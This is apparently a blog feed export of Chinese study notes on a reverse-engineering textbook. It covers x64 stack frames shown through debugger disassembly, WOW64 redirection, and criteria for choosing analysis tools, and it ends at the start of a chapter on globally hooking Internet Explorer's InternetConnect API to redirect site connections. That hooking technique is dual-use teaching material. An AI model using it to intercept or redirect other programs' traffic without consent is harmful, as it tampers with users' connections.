ret<br></code></pre></td></tr></table></figure><p>Stack64.exe代码具有如下几个特征。</p><p>特征一，使用“变形”的栈帧。在代码起始部分分配48h（72d）字节大小的栈，最后在RET命令之前释放。这样大小的栈对于存储局部变量、函数参数等足够了。还有一点需要注意的是，栈操作并未使用RBP寄存器，而直接使用RSP寄存器。</p><p>特征二，几乎没有使用PUSH&#x2F;POP指令。请认真看看调用CreateFileA()API时设置参数的代码（00000001<code>40001004~00000001</code>40001028）。第 1<del>4个参数使用寄存器（RCX、RDX、R8、R9）， 第5</del>7个参数使用栈。main()函数开始执行时，使用MOV指令将参数放入分配的栈。有意思的是，并未看到调用者清理栈（64位fastcall的特征）的代码，原因在于子函数使用的是分配给main()函数的栈，子函数本身不会分配到栈或扩展栈。main()函数的栈管理由main()函数自身负责，子函数不需要管理通过栈传递的参数。</p><p>特征三，第五个参数之后的参数在栈中的存储位置。调用CreateFileA() API前要设定参数，设置顺序比较混乱（函数参数在32位程序中会依序压入栈）。第1-4个参数使用寄存器（RCX、RDX、R8、R9）,从第五个参数开始使用栈，但第五个参数在栈中的存储位置显得有些奇怪。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000140001028 | C74424 20 03000000       | mov dword ptr ss:[rsp+20],3         ; 5th - Mode<br></code></pre></td></tr></table></figure><p>从以上代码可以看到，第五个参数在栈中的存储位置为[rsp+20h]，并未指向栈顶（[rsp]）。原因在于，虽然x64系统中第1~4个参数使用寄存器传递，但栈中仍然为它们预留了同等大小的空间（20h&#x3D;32d&#x3D;4param*8字节）。所以，第五个参数开始的参数从栈的[rsp+20h]位置（非[rsp]位置）开始保存（这样预留的栈空间也可以在子函数中使用）。接下来进入CreateFileA() API查看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000778731F0  48:895C24 08              mov qword ptr ss:[rsp+8],rbx            <br>00000000778731F5  48:896C24 10              mov qword ptr ss:[rsp+10],rbp           <br>00000000778731FA  48:897424 18              mov qword ptr ss:[rsp+18],rsi           <br>00000000778731FF  57                        push rdi                                <br>0000000077873200  48:83EC 60                sub rsp,60                              <br>0000000077873204  8BFA                      mov edi,edx                             <br>0000000077873206  48:8BD1                   mov rdx,rcx                             <br>0000000077873209  48:8D4C24 50              lea rcx,qword ptr ss:[rsp+50]           <br>000000007787320E  49:8BF1                   mov rsi,r9                              <br>0000000077873211  41:8BE8                   mov ebp,r8d                             <br>0000000077873214  FF15 26950700             call qword ptr ds:[&lt;&amp;RtlInitAnsiStringE <br>000000007787321A  85C0                      test eax,eax                            <br>000000007787321C  0F88 EC5A0100             js kernel32.77888D0E                    <br><br>...<br><br>0000000077873263  8BD7                      mov edx,edi                             <br>0000000077873265  E8 86FEFFFF               call kernel32.778730F0                  <br>000000007787326A  48:85C0                   test rax,rax                            <br>000000007787326D  0F85 765A0100             jne kernel32.77888CE9                   <br>0000000077873273  48:8B8424 A0000000        mov rax,qword ptr ss:[rsp+A0]           <br>000000007787327B  4C:8BCE                   mov r9,rsi                              <br>000000007787327E  44:8BC5                   mov r8d,ebp                             <br>0000000077873281  48:894424 30              mov qword ptr ss:[rsp+30],rax           <br>0000000077873286  8B8424 98000000           mov eax,dword ptr ss:[rsp+98]           <br>000000007787328D  8BD7                      mov edx,edi                             <br>000000007787328F  894424 28                 mov dword ptr ss:[rsp+28],eax           <br>0000000077873293  8B8424 90000000           mov eax,dword ptr ss:[rsp+90]           <br>000000007787329A  48:8BCB                   mov rcx,rbx                             <br>000000007787329D  894424 20                 mov dword ptr ss:[rsp+20],eax           <br>00000000778732A1  E8 E2FEFFFF               call &lt;JMP.&amp;CreateFileW&gt;                 <br>00000000778732A6  48:8BD8                   mov rbx,rax                             <br>00000000778732A9  48:8D4C24 40              lea rcx,qword ptr ss:[rsp+40]           <br>00000000778732AE  FF15 1C990700             call qword ptr ds:[&lt;&amp;RtlFreeUnicodeStri <br>00000000778732B4  48:8BC3                   mov rax,rbx                             <br>00000000778732B7  48:8B5C24 70              mov rbx,qword ptr ss:[rsp+70]           <br>00000000778732BC  48:8B6C24 78              mov rbp,qword ptr ss:[rsp+78]           <br>00000000778732C1  48:8BB424 80000000        mov rsi,qword ptr ss:[rsp+80]           <br>00000000778732C9  48:83C4 60                add rsp,60                              <br>00000000778732CD  5F                        pop rdi                                 <br>00000000778732CE  C3                        ret<br></code></pre></td></tr></table></figure><p>先看一下由寄存器与栈传递来的参数（参考图37-7）。栈传递的参数之上是参数1-4的预留空间（00000000<code>0012FEE0~00000000</code>0012FEF8）（参考图37-8）。虽然未在传递函数参数时使用，但是从代码37-3的前3个指令可以看到向该空间赋值的操作（有时采用这种方式使用）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC37%E7%AB%A0%20x64%E5%A4%84%E7%90%86%E5%99%A8.assets/image-20220318135046644.png#alt=image-20220318135046644"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC37%E7%AB%A0%20x64%E5%A4%84%E7%90%86%E5%99%A8.assets/image-20220318135504279.png#alt=image-20220318135504279"></p><p>最后谈谈代码37-3中的CreateFileA()的栈帧。由于该函数较长且复杂，所以分配了60h（96d）大小的栈。遇到上面这种情况，调CreateFileW()时使用寄存器和栈，与32位环境下的情形是一致的，重复的值被放入栈。</p><blockquote><p>如果CreateFileA()是一个非常简单的函数，自身不需要使用栈帧，不向栈放入重复值的情形下，可以原样调用CreateFileW()函数。函数用中，64位的这种调用方式要比32位的调用方式好得多。</p></blockquote><h1 id="37-3小结"><a href="#37-3小结" class="headerlink" title="37.3小结"></a>37.3小结</h1><p>x64并不只是x86的扩展，设计时做了非常大的改变，Windows 64位OS与开发工具中也存在很多与32位系统不同的部分。现在正处于32位到64位的过渡期，各种信息稀少且杂乱。但制造商非常细心地考虑了HW&#x2F;SW的向下兼容性，相信能够平稳渡过整个过渡期。64位时代真正到来时，与逆向分析工具及逆向分析方法相关的信息会得到更新升级，进行代码逆向分析会更轻松。</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第36章 64位计算</title>
    <link href="/1999/03/06/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC36%E7%AB%A0%2064%E4%BD%8D%E8%AE%A1%E7%AE%97/"/>
    <url>/1999/03/06/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC36%E7%AB%A0%2064%E4%BD%8D%E8%AE%A1%E7%AE%97/</url>
    
    <content type="html"><![CDATA[<p>第36章64位计算</p><p>不知不觉间，64位0S得到快速普及，本章讲解代码逆向分析工程师必须学习的64位计算（64bit Computing ）相关知识。</p><h1 id="36-1-64位计算环境"><a href="#36-1-64位计算环境" class="headerlink" title="36.1 64位计算环境"></a>36.1 64位计算环境</h1><p>80386是Intel于1985年推出的CPU芯片，它是一种32位微处理器。当时由于其价格高昂、支持的OS少，几乎没有得到普及。随着1995年微软发布32位OS Winows 95,计算机正式进人32位计算时代。Windows 95向下兼容支持16位程序，已有的DOS应用程序大部分也能够稳定运行。经过几年16位&#x2F;32位混用的过渡期，OS进入Windows 2000&#x2F;XP时代，32位应用程序开始成为主流，并延续至今。此过程中，CPU、OS制造厂商深刻认识到32位PC的局限（主物理内存最大为4GB ），纷纷开始开发64位版本，这就是64位CPU与64位OS共同构成的64位计算环境。</p><h2 id="36-1-1-64位-CPU"><a href="#36-1-1-64位-CPU" class="headerlink" title="36.1.1 64位 CPU"></a>36.1.1 64位 CPU</h2><p>在32位CPU时代，Intel主导着技术主流（x86 ），AMD生产x86兼容芯片，形成追击之势。但 64位CPU中出现了比较有意思的事情。Intel最初发布的64位CPU IA-64（产品名：Itanium ）是一款64位的功能强大的芯片。有意思的是，全新IA-64采用了与原x86系列（IA-32 ） CPU完全不同的芯片。就像IBM的PowerPC系列一样，搭载的寄存器以及使用的指令都是完全不同的，无法与现有的IA-32直接兼容（使用模拟器可以实现间接兼容，但速度慢）。</p><p>其实，IA-64是Intel与HP合作的产物，设计的初衷可能是为了大幅提高计算机性能，霸占整个PC与服务器市场，从而抛弃了向下兼容的特性。但是想要市场（特别是PC市场）放弃向下兼容可不容易。此后AMD发布了AMD64,它是一款兼容IA-32的64位芯片。支持向下兼容的AMD64在PC市场上大受欢迎。为了应对这种情况，Intel从AMD购买使用许可，发布了与AMD64兼容的EM64T,后来改名为Intel64。最近Intel推岀的Core2 Duo、i7&#x2F;i5&#x2F;i3等CPU就是Intel64系列的。通常说的x64是AMD64与Intel64的合称，指的是与现有x86（IA-32 ）兼容的64位CPU,主要用于普通PC和服务器。而IA-64是与x64具有完全不同形态的CPU，主要用在大型服务器与超级计算机中。</p><p><strong>术语一览</strong></p><p>讲解64位CPU时会遇到相当多的术语，这可能会给各位造成困惑。现将常用术语整理如下。</p><table><thead><tr><th align="center">术语</th><th>说明</th></tr></thead><tbody><tr><td align="center">AMD64</td><td>AMD研制的64位CPU（直接向下兼容x86）</td></tr><tr><td align="center">EM64T</td><td>Intel研制的兼容AMD64的CPU</td></tr><tr><td align="center">Intel64</td><td>EM64T的新名称</td></tr><tr><td align="center">IA-64</td><td>Intel与HP合作研发的64位CPU（可通过模拟器间接兼容x86）</td></tr><tr><td align="center">x86</td><td>Intel的IA-32、IA-16、IA-8系列的CPU</td></tr><tr><td align="center">x64</td><td>AMD64 &amp; Intel64</td></tr></tbody></table><h2 id="36-1-2-64位OS"><a href="#36-1-2-64位OS" class="headerlink" title="36.1.2 64位OS"></a>36.1.2 64位OS</h2><p>PC中使用的Windows 64位操作系统有Windows XP&#x2F;Vista&#x2F;7的64位版本。微软认为能否向下兼容32位是决定64位OS成败的关键，支持32位也被看作是64位OS的核心功能。为此，微软提供了名为WOW64的机制，现有的32位应用程序能够在这种机制下正常运行，使现有32位源码可以很容易地移植到64位系统。</p><p><strong>LLP64数据模型</strong></p><p>64位Windows中使用LLP64数据模型实现向下兼容，它将现有32位Windows数据模型（ILP32 ）</p><p>中的指针大小更改为64位。所以将现有的32位源代码移植到64位系统时，只要在指针类型变换上</p><p>下工夫就行了</p><table><thead><tr><th>数据类型</th><th>short</th><th>int</th><th>long</th><th>longlong</th><th>指针</th><th>OS</th></tr></thead><tbody><tr><td>ILP32</td><td>16</td><td>32</td><td>32</td><td>64</td><td>32</td><td>MS Windows 32位</td></tr><tr><td>LLP64</td><td>16</td><td>32</td><td>32</td><td>64</td><td>64</td><td>MS Windows 64位</td></tr><tr><td>LP64</td><td>16</td><td>32</td><td>64</td><td>64</td><td>64</td><td>UNIX 64位</td></tr></tbody></table><p>还有一点需要注意的是，HANDLE类型大小在64位Windows中已经变为64位。</p><p>另外，64位UNIX系列使用LP64数据模型，它与LLP64的不同在于长整型类型的大小为64位。</p><blockquote><p>ILP32： Integer、Long、Pointer-32位。</p></blockquote><p>LLP64： LongLong、Pointer-64位。</p><p>LP64： Long、Pointer-64位</p><h2 id="36-1-3-Win32-API"><a href="#36-1-3-Win32-API" class="headerlink" title="36.1.3 Win32 API"></a>36.1.3 Win32 API</h2><p>创建64位应用程序时，现有的Win32 API几乎可以照搬使用，而非另外提供一套Win64 API。开发人员不用再熟悉新增的API，没有这个负担也是非常吸引人的地方。通过诸如此类的各种考虑，轻松实现将现有32位源代码移植到64位系统。</p><blockquote><p>微软为了向下兼容并未另外制作Win64，以后安装64位系统时也会一同提供Win64。</p></blockquote><h2 id="36-1-4-WOW64"><a href="#36-1-4-WOW64" class="headerlink" title="36.1.4 WOW64"></a>36.1.4 WOW64</h2><p>现在正处于32位到64位的过渡期，在64位OS中正常运行现有的32位应用程序是重中之重。就像先前的Windows 95能够同时支持32位Windows应用程序与16位的DOS程序运行一样。WOW64（Windows On Windows 64 ）是一种在64位OS中支持运行现有32位应用程序的机制。</p><p>64位Windows中，32位应用程序与64位应用程序都可以正常运行。64位应用程序会加载</p><p>kernel32.dll（64位）与ntdll.dll（64位）。而32位应用程序则会加载kernel32.dll（32位）与ntdll.dll（32位），WOW64会在中间将ntdll.dll（32位）的请求（API调用）重定向到ntdll.dll（64位）。</p><p>也就是说，64位Windows提供了32位Windows的系统环境，用来运行32位应用程序。并在中途借助WOW64将其变换为64位环境，如图36-1所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC36%E7%AB%A0%2064%E4%BD%8D%E8%AE%A1%E7%AE%97.assets/image-20220313122642236.png#alt=image-20220313122642236"></p><blockquote><p>WOW64仅运行在用户模式下，运行在内核模式中的驱动程序（Driver）文件必须 编译成64位。内核模式中发生内存引用错误时，就会引发BSOD（Blue Screen Of Death,蓝屏死机）问题，所以为了保证系统稳定性，WOW64被限制在用户模式下运行。</p></blockquote><p><strong>文件夹结构</strong></p><p>64位Windows的文件夹结构中，开发人员与逆向分析人员都需要明确知道一点，那就是System32文件夹。系统文件夹在64位环境中的名称也为System32,并且为了向下兼容32位，单独 提供了SysWOW64文件夹，如图36-2所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC36%E7%AB%A0%2064%E4%BD%8D%E8%AE%A1%E7%AE%97.assets/image-20220313123227223.png#alt=image-20220313123227223"></p><p>System32文件夹中存放着64位的系统文件，而SysWOW64文件夹中则存放着32位的系统文件。向用户提供的重要的系统文件被分别编译成64位与32位（参考图39-3、图39-4 ）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC36%E7%AB%A0%2064%E4%BD%8D%E8%AE%A1%E7%AE%97.assets/image-20220313123643128.png#alt=image-20220313123643128"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC36%E7%AB%A0%2064%E4%BD%8D%E8%AE%A1%E7%AE%97.assets/image-20220313123710584.png#alt=image-20220313123710584"></p><p>有意思的是，64位应用程序中使用GetSystemDirectory() AW查找系统文件夹，正常返回System32文件夹。32位应用程序中调用GetSystemDirectory()返回的文件夹名称也为System32，但文件夹的实际内容与SysWOW64文件夹是一样的。这是WOW64在中间截获了API调用并进行操作后返回的结果，这使32位应用程序可以正常运行。</p><blockquote><p>像 System32&#x2F;SysWOW64—样，Program Files 与 Program Files（x86）文件夹并不是直接重定向的对象。32位应用程序中使用SHGetSpecialFolderPath() API获取Program Files文件夹路径时，WOW64会在中间对其截获，并返回Program Files（x86）路径。32位应用程序中，SysWOW64文件夹名称看似被修改成System32,但是Program Files（x86）文件夹会原样显示。</p></blockquote><p><strong>注册表</strong></p><p>64位Windows中的注册表分为32位注册表项与64位注册表项，如图36-5所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC36%E7%AB%A0%2064%E4%BD%8D%E8%AE%A1%E7%AE%97.assets/image-20220313124301777.png#alt=image-20220313124301777"></p><p>32位进程请求访问HKLM\SOFTWARE下的键时，WOW64会将其重定向到32位的HKLM\SOFTWARE\Wow6432Node下的键。有关注册表重定向的更多内容请参考下面MSDN链接。与文件系统重定向相比，注册表通常显得更加复杂。需要做精确开发与逆向分析的人员，请务必认真阅读下面链接中的内容。</p><p><a href="http://msdn.microsoft.com/en-us/library/aa384232(v=VS.85).aspx">http://msdn.microsoft.com/en-us/library/aa384232(v=VS.85).aspx</a></p><blockquote><p>与文件系统不同，注册表无法完全分离为32位与64位两部分，经常出现32&#x2F;64位共用的情形。有时候向32位部分写入的值会自动写入64位部分。所以对运行在WOW64环境中的程序进行逆向分析时，必须准确知道访问的究竟是注册表的哪一部分（32位还是64位）。</p></blockquote><h2 id="36-1-5-练习：WOW64Test"><a href="#36-1-5-练习：WOW64Test" class="headerlink" title="36.1.5 练习：WOW64Test"></a>36.1.5 练习：WOW64Test</h2><p>下面准备了一个简单的示例，用来测试WOW64。WOW64Test_x86.exe被编译为32位文件， 在WOW64模式下运行。而WOW64Test_x64.exe被编译为64位文件，运行在64位Native模式下。两个文件的源文件（WOW64Test.cpp ）都是一样的0</p><blockquote><p>要正常运行&#x2F;调试WOW64Test_x64.exe文件，需要Windows XP&#x2F;Vista&#x2F;7 64位系统环境支持。</p></blockquote><p>图36-6是分别运行它们得到的结果</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC36%E7%AB%A0%2064%E4%BD%8D%E8%AE%A1%E7%AE%97.assets/image-20220313124613149.png#alt=image-20220313124613149"></p><p>运行示例程序可以获取以下4种信息：</p><p>“system32” path</p><p>File size of “kernel32.dll”</p><p>“Program Files” path</p><p>Create Registry Key: ”HKLM\SOFTWARE\ReverseCore“</p><p>从运行结果画面可以看到，64位WOW64Test_x64.exe从准确位置（与源代码中的内容一样）获取值并生成了注册表键。但是以WOW64模式运行的32位WOW64Test_x86.exe行为略有不同。它虽然把System32文件夹目录识别为“C:\Windows\system32”，但其内容却指向SysWOW64文件夹（从kernel32.dll的文件尺寸即可得知）。还有Program Files目录被返回为“Program Files（x86）”。</p><p>创建注册表项时，实际创建的不是HKLM\SOFTWARE\ReverseCore，而是HKLM\SOFTWARE</p><p>Wow6432Node\ReverseCore。以WOW64模式运行的32位应用程序会像这样对文件（文件夹）与</p><p>注册表进行重定向，请各位一定要注意这点。</p><blockquote><p>在64位Windows环境中逐一运行示例文件，然后利用文件浏览器与注册表编辑器</p></blockquote><p>查看运行结果。</p><h1 id="36-2-编译64位文件"><a href="#36-2-编译64位文件" class="headerlink" title="36.2 编译64位文件"></a>36.2 编译64位文件</h1><p>本节将向各位介绍编译64位PE文件（PE+或PE32+）的方法。32位与64位Windows OS中都可 以分别交叉编译（Cross Compile ） 32位&#x2F;64位PE文件。最简单的方法是安装Visual Studio 2012。</p><p>Visual Studio 2012 是默认提供64位编译环境的。</p><h2 id="36-2-1设置-Visual-Studio-2012-环境"><a href="#36-2-1设置-Visual-Studio-2012-环境" class="headerlink" title="36.2.1设置 Visual Studio 2012 环境"></a>36.2.1设置 Visual Studio 2012 环境</h2><ol><li>选择“Build” – “Configuration Manager”菜单，打开配置管理器。点击新建解决方案平台。</li></ol><p><img src="https://images0.cnblogs.com/i/311574/201408/072142107096334.jpg#alt=img"></p><p>2.<br>选择“x64”平台，点击确定按钮。</p><p>3.<br>这时候配置管理器中的平台已经改成刚才选择的x64了，这时候编译出来的就是64位程序了。可以在工具栏的平台下拉框中快速切换目标平台。</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第35章 优秀分析工具的五种标准</title>
    <link href="/1999/03/05/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC35%E7%AB%A0%20%E4%BC%98%E7%A7%80%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BA%94%E7%A7%8D%E6%A0%87%E5%87%86/"/>
    <url>/1999/03/05/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC35%E7%AB%A0%20%E4%BC%98%E7%A7%80%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BA%94%E7%A7%8D%E6%A0%87%E5%87%86/</url>
    
    <content type="html"><![CDATA[<p>第35章优秀分析工具的五种标准</p><h1 id="35-1-工具"><a href="#35-1-工具" class="headerlink" title="35.1 工具"></a>35.1 工具</h1><p>无论哪个领域，技术人员（工程师）都有适合自己的工作环境以及用着顺手的工具（装备)。所谓技术人员，就是指熟练使用某一类工具并用这些工具完成特定任务的人。即便是同一套工具，不同水平的技术人员使用时也会产生完全不同的效果（甚至有人会亲自制作要使用的工具)。并 且，技术人员拥有并熟悉了一套适合自己的工具后，一般会长期使用，不到万不得已是不会换用其他工具的（即使更换，也会换同一公司生产的新品）。不管怎样，使用别人的工具、在别人的工作环境下做事，总让人感觉不方便。也就是说，只有在自己的工作环境下使用自己用着顺手的工具，才能100%发挥出自己的技术水平。</p><h1 id="35-2代码逆向分析工程师"><a href="#35-2代码逆向分析工程师" class="headerlink" title="35.2代码逆向分析工程师"></a>35.2代码逆向分析工程师</h1><p>代码逆向分析工程师（Reversed是什么样的呢？代码逆向分析工程师是IT工程领域的工作人员，他们与上面提到的普通技术人员在本质上并没有什么不同。代码逆向分析领域中使用的工具有数十种之多，各类工具又有多种不同的产品。此外，IT领域的特性又会导致不断涌现出大量新工具。代码逆向分析中用到的工具种类相当多，常用的列出如下(此外还有大量未提及的工具）：</p><p>逆向分析工具的种类：</p><p>□ disassembler</p><p>□ debugger-PE、script 等</p><p>□ development tool-assembly、C&#x2F;C &lt;- f 等</p><p>□ editor(viewer)-text、hex、resource、registry、string、PE 等</p><p>□ monitoring tool-process、file、registry、network、message 等</p><p>□ memory dump</p><p>□ classifier</p><p>□ calculator-hex、binary</p><p>□ compare tool-text、hex</p><p>□ packer&#x2F;unpacker</p><p>□ encoder&#x2F;decoder</p><p>□ virtual machine</p><p>□ decompiler-C、VB、Delphi 等</p><p>□ emulator</p><h1 id="35-3-优秀分析工具的五种标准"><a href="#35-3-优秀分析工具的五种标准" class="headerlink" title="35.3 优秀分析工具的五种标准"></a>35.3 优秀分析工具的五种标准</h1><p>以下是我选择分析工具时使用的5种标准（指导），供各位参考。希望各位根据自身实际情况确立自己的工具选用标准。</p><h2 id="35-3-1-精简工具数量"><a href="#35-3-1-精简工具数量" class="headerlink" title="35.3.1 精简工具数量"></a>35.3.1 精简工具数量</h2><p>不能因为别人都用某个工具所以自己也准备很多还不了解功能的工具，这样是没用的。自己需要用的工具每种1个就够了。刚开始要根据自身水平选择相应工具，然后随着水平的提高慢慢增加即可。此外，还有很多工具功能都是重复的，这样的工具用1个就行了。</p><h2 id="35-3-2-工具功能简单、使用方便"><a href="#35-3-2-工具功能简单、使用方便" class="headerlink" title="35.3.2 工具功能简单、使用方便"></a>35.3.2 工具功能简单、使用方便</h2><p>随着水平的提高，使用的工具数量也会增加。此时工具的功能越简单、用户界面越直观，使用起来就越方便。这里说的“功能简单”是作为代码逆向分析工具而言，从一般人的视角来看，它仍是使用方法非常复杂的工具。所以无论多么简单的逆向分析工具，都要花费相当时间来熟悉。</p><h2 id="35-3-3-完全掌握各种功能"><a href="#35-3-3-完全掌握各种功能" class="headerlink" title="35.3.3 完全掌握各种功能"></a>35.3.3 完全掌握各种功能</h2><p>再好的工具首先也要懂得使用，不然就毫无用处。很多时候本来是自己所用工具已有的功能，但因为不熟悉，需要该功能时不得不找其他工具来代替。选中某个工具后，要认真阅读使用说明，熟悉各种功能。常用功能的快捷键要记住，这会使工作更加容易，提高工作效率（学会灵活使用工具快捷键就会越来越喜欢，用起来也更得心应手)。</p><h2 id="35-3-4-不断升级更新"><a href="#35-3-4-不断升级更新" class="headerlink" title="35.3.4 不断升级更新"></a>35.3.4 不断升级更新</h2><p>逆向分析技术发展相当快，随着新技术的不断涌现，与之对应的工具变化也很快，所以经常更新所用工具是非常重要的。因此，建议大家选择能够持续更新的工具。 .</p><h2 id="35-3-5-理解工具的核心工作原理"><a href="#35-3-5-理解工具的核心工作原理" class="headerlink" title="35.3.5 理解工具的核心工作原理"></a>35.3.5 理解工具的核心工作原理</h2><p>理解工具的工作原理能够帮助我们更好地使用工具。当然，在此基础上能够开发出测试原型(prototype)更是锦上添花。我们使用某个工具时通常不怎么关心其工作原理，但若想真正提高自身的代码逆向分析水平，了解工作原理是非常必要的。比如，理解了调试器的工作原理后就能很好地避开反调试技术的阻碍。如果不理解工具的工作原理，一味依赖它，程序中的一些简单花招就都无法解决，不得不寻找新的工具，最后沦为“工具的奴隶”（一定要警惕这一点)。</p><h1 id="35-4-熟练程度的重要性"><a href="#35-4-熟练程度的重要性" class="headerlink" title="35.4 熟练程度的重要性"></a>35.4 熟练程度的重要性</h1><p>各位听说过debug.exe这个程序吗？它从MS-DOS时代就存在，是16位的调试器（Windows XP</p><p>中也有）。在命令窗口运行debug.exe，输入“？”命令，显示帮助选项。</p><p>图35-1显示的就是全部指令，很简单。我曾看到一个朋友使用debug.exe调试分析16位的DOS</p><p>程序。当时只看见他运行某个工具，快速敲击键盘，画面不断滚动切换，我就站在他身旁，但根</p><p>本看不岀他在干什么（眼睛根本跟不上他的调试速度），甚至没有意识到刚开始运行的是debug.exe程序（那时我接触debug.exe已经一个多月了，但是仍然没有意识到这点）。后来我知道他用的是debug.exe时被惊得目瞪口呆，“只使用那么简单的debug.exe，竟然能那么快解决问题？”从那以后，我选择某个工具时就立下了一条规矩，并且有了更深层次的认识。</p><blockquote><p>“即便是普通的工具，对其认真研习并运用到极致，它也能成为天下独一无二的优秀工具。”</p></blockquote><p>就像武林高手经过木断修炼、再修炼，丢弃有形的“剑”，他们眼里任何东西都是剑器，如 草、木、竹、石等，达到“手中无剑心中有剑”的境界。各位意下如何呢？</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第34章 高级全局API钩取：旧连接控制</title>
    <link href="/1999/03/04/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6/"/>
    <url>/1999/03/04/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<p>第34章高级全局API钩取：旧连接控制</p><p>本章将学习更高级的全局API钩取技术，在示例中我们将钩取IE，使其试图连接到指定网站时转而连接到我的博客。</p><p>练习目标是钩取IE进程的API，在它连接到特定网站的过程中，将其连接到其他网站。无论是在IE地址栏中直接输入地址还是点击某个链接，IE都无法连接到被阻止的网站（把这当作拦恶意网页功能就比较容易理解）。</p><blockquote><p>在防火墙层面实现恶意网页拦截功能会更有效果。本章示例仅供学习之用，在实际产品开发中实现恶意网页拦截功能时要充分考虑这一点</p></blockquote><h1 id="34-1-目标-API"><a href="#34-1-目标-API" class="headerlink" title="34.1 目标 API"></a>34.1 目标 API</h1><p>API钩取的核心就是选择目标API，即要钩取的API，每个入在这一过程中都有各自不同的绝招。程序开发经验越丰富、API钩取经验越多，对选择目标API就越有利（当然，通过强大的网络检索功能也能解决大部分问题）。开始前先大致“猜测” 一下，只要钩取套接字库（ws2_32.dll）或微软提供的网络访问相关库（wininet.dll、 winhttp.dll）就可以了（钩取后者更容易）。</p><p>下面运行IE进行分析。首先使用Process Explorer查看IE加载了哪些DLL。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC34%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%85%A8%E5%B1%80API%E9%92%A9%E5%8F%96%EF%BC%9AIE%E8%BF%9E%E6%8E%A5%E6%8E%A7%E5%88%B6.assets/image-20220306124353124.png#crop=0&crop=0&crop=1&crop=1&id=jyEph&originHeight=605&originWidth=806&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图34-1 IE中加载的库"></p><p>从图34-1可以看到，IE不仅加载了ws2_32.dll，还加载了wininet.dll库。Wininet.dll提供的API中有个名为InternetConnect()的API （出处：MSDN ），顾名思义，该API用来连接某个网站。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">HINTERNET <span class="hljs-title function_">InternetConnect</span><span class="hljs-params">(</span><br><span class="hljs-params">  [in] HINTERNET     